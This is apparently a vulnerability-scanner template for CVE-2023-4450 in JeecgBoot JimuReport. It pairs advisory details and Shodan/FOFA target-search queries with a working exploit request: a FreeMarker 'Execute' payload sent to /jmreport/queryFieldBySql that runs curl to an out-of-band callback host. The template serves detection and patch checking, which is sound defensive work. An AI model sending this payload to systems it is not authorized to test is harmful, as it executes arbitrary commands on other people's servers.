id: CVE-2023-4450

info:
  name: JeecgBoot JimuReport Template injection
  author: Sumanth Vankineni
  severity: critical
  description: |
    A vulnerability was found in jeecgboot JimuReport up to 1.6.0. It has been declared as critical. Affected by this vulnerability is an unknown functionality of the component Template Handler. The manipulation leads to injection. The attack can be launched remotely. The exploit has been disclosed to the public and may be used. 
  impact:  Unauthorized api called /jmreport/queryFieldBySql led to remote arbitrary code execution due to parsing SQL statements using Freemarker.
  remediation: Upgrading to version 1.6.1 is able to address this issue. It is recommended to upgrade the affected component.
  reference:
    - https://github.com/advisories/GHSA-j8h5-8rrr-m6j9
    - https://whoopsunix.com/docs/java/named%20module/
    - https://nvd.nist.gov/vuln/detail/CVE-2023-4450
  metadata:
    verified: true
    max-request: 1
    vendor: jeecg
    product: jeecg
    shodan-query:
      - title:"Jeecg-Boot"
      - http.title:"jeecg-boot"
    fofa-query:
      - title="JeecgBoot 企业级低代码平台"
      - title="jeecg-boot"
      - title="jeecgboot 企业级低代码平台"
    google-query: intitle:"jeecg-boot"
  tags: cve,cve2023,rce,jeecgboot

http:
  - method: POST
    path:
      - "{{BaseURL}}/jmreport/queryFieldBySql"
    headers:
      Content-Type: application/json

    body: |
      {
        "sql": "select 'result:<#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ex(\"curl {{interactsh-url}}\")}'"
      }

    matchers-condition: and
    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "dns"

      - type: word
        part: header
        words:
          - "ListManagerWeb"

      - type: status
        status:
          - 200
